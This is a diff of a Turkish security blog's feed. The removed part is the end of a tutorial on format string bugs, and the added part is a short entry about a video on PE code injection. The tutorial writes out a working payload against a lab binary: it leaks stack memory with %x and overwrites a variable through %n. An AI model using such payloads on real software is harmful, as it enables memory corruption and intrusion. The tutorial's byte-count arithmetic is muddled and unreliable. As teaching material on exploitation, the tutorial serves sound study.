-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@blacknbunny:/home/blacknbunny# ./vuln &quot;0x%x 0x%x 0x%x 0x%x&quot;
-Girdiniz: 0xbffff9b6 0x174 0x174 0x78257830
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;hr /&gt;
-&lt;p&gt;&lt;br /&gt;
-Şimdi burdan olayımızı veriye yazmaya yani belirtilen hedef degiskenini düzenlemeye kadar nasıl götürebiliriz ? Cevabımızda aşşağıda :&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@blacknbunny:/home/blacknbunny# ./vuln `python -c &quot;print('AAAA' + '\xa4\x96\x04\x08'  + 'BBBB' + '.%x'*4 + '%n')&quot;`
-Girdiniz: AAAABBBB.bffff9af.bffff7a8.b7eada75.41414141hedef degiskeni duzenlendi
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Çıktımızda da gördüğümüz gibi hedef değişkenini yukarıda parametre olarak verdiğimiz python command-line girdisi ile düzenledik. Peki bunu nasıl başardık yani sadece küçük bir &lt;strong&gt;printf&lt;/strong&gt; fonksiyonundan hafıza(memory) içerisindeki leak’ten corruption’a yani hafızayı bozmaya ya da düzenlemeye kadar gidebildik ?&lt;/p&gt;
-
-&lt;p&gt;İlk önce 4 bytelık bir veri verdik. Buda “AAAA” oluyor.&lt;/p&gt;
-
-&lt;p&gt;Sonrasında alttaki komutumuz ile &lt;strong&gt;hedef&lt;/strong&gt; değişkenimizin adresini &lt;strong&gt;0x80496a4&lt;/strong&gt; olarak bulduk ve 2. olarak python command-line girdimize onu verdik. :&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@blacknbunny:/home/blacknbunny# objdump -t ./vuln
-
-...
-00000000       F *UND*  00000000              printf@@GLIBC_2.0
-0804969c g       *ABS*  00000000              __bss_start
-080496a8 g       *ABS*  00000000              _end
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;strong&gt;080496a4&lt;/strong&gt; g     O .bss   00000004              hedef&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0804969c g       *ABS*  00000000              _edata
-...
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ve 3. olarak 4 bytelık “BBBB”mizi verdik ki hedefin üzerine “BBBB” yi kullanarak “%n” format string’i ile yazabilelim. %n’in ne olduğunu bilmiyorsanız en üstte bulunan “Format Stringleri içeren tablo”suna da bakabilirsiniz.&lt;/p&gt;
-
-&lt;hr /&gt;
-&lt;p&gt;&lt;br /&gt;
-Başta da memoryi leak etmemizi sağlayan “%x” format stringini hatırlıyorsunuzdur. Onuda en sona koyduk ki bu işlemleri yaparken hafızamızı yani memoryi gözlemleyebilelim.&lt;/p&gt;
-
-&lt;p&gt;Sonrasında da “%n” format stringimizi “0x80496a4BBBB.%x.%x.%x.%x%n” metininin toplam byte sayısını &lt;strong&gt;hedef&lt;/strong&gt; değişkeninin üzerine yazmak için kullandık.&lt;/p&gt;
-
-&lt;p&gt;Toplam byte sayısını hesaplamak için :&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;4 = &quot;AAAA&quot;
-
-4 = &quot;0x80496a4&quot; # int hedef; değişkenimizin adresi
-
-4 = &quot;BBBB&quot;
-
-4 = &quot;.%x.&quot;
-
-4 = &quot;%x.%&quot;
-
-4 = &quot;x.%x&quot;
-
-------------------------------------------------------------------------
-
-
-&quot;AAAA&quot; *  &quot;0x80496a4&quot;
-
-4 * 4 = 16
-
-&quot;BBBB&quot; * &quot;.%x.&quot;
-
-4 * 4 = 16
-
-&quot;%x.%&quot; *  &quot;x.%x&quot;
-
-4*4 = 16
-
-16 + 16 + 16 = 48
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Bu da demek oluyor ki &lt;strong&gt;int target;&lt;/strong&gt; değişkenimizin üzerine 48 yazmışız ki bunun da hex karşılığı 0x30 oluyor.&lt;/p&gt;
-
-&lt;p&gt;Tam olarak &lt;strong&gt;int target;&lt;/strong&gt; değişkenimizin üzerinde memory(hafıza) içerisinde &lt;strong&gt;0x30&lt;/strong&gt; mevcut.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Format_string_attack&quot;&gt;OWASP&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://www.geeksforgeeks.org/format-string-vulnerability-and-prevention-with-example/&quot;&gt;Geeksforgeeks&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://linux.die.net/man/3/printf&quot;&gt;Man page&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Printf_format_string&quot;&gt;Wikipedia&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Format String Nedir ? Format string metin ve format parametreleri tutan bir ASCII’dir. Çoğu programlama dilinde de görebiliriz ki herhangi bir metin yazacağımız zaman bu metini direk yazımızın içine değilde bir değişkene aktarırız, ve bu değişkenide yazımızın içerisinde format stringler aracılığıyla kullanırız.</summary></entry></feed>
+&lt;p&gt;Kısa bilgi : Video kayıdına aldığım bu konu basit şekilde PE(Portable Executable) çalıştırılabilir (Win 32/64 bit) .exe dosyalarının biraz analizini &amp;amp; tam anlamı ilede içerisine kod enjeksiyonunun(Code Injection) yapılmasını anlattım. İyi izlemeler.&lt;/p&gt;</content><author><name></name></author><summary type="html">Paylaştığım video da blogum da yayınlıyacağım demiştim fakat fikrimi değiştirdim çünkü video da herşeyi en son detayına kadar anlatmışım ve 25 dakika sürmüş. Eğer bu blog kısmında da anlatmaya çalışırsam zilyon sayfa yazı çıkar. O yüzden direk youtube linkini paslıyorum izlemek isteyenler için. :</summary></entry></feed>
